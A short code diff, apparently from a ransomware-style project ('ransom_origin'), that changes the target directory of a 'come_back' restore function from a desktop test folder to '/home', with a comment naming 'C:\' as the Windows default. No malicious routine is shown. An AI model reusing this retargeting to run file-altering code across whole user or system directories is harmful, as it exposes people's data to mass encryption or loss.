@@ -19,7 +19,7 @@ def come_back(directory):
         #print()
 
 
-original = "/home/mike234/Desktop/ransom_origin"
+original = "/home" ## here you specify the original directory (check out the README file) (C:\ in windows as default)
 come_back(original)
 
 
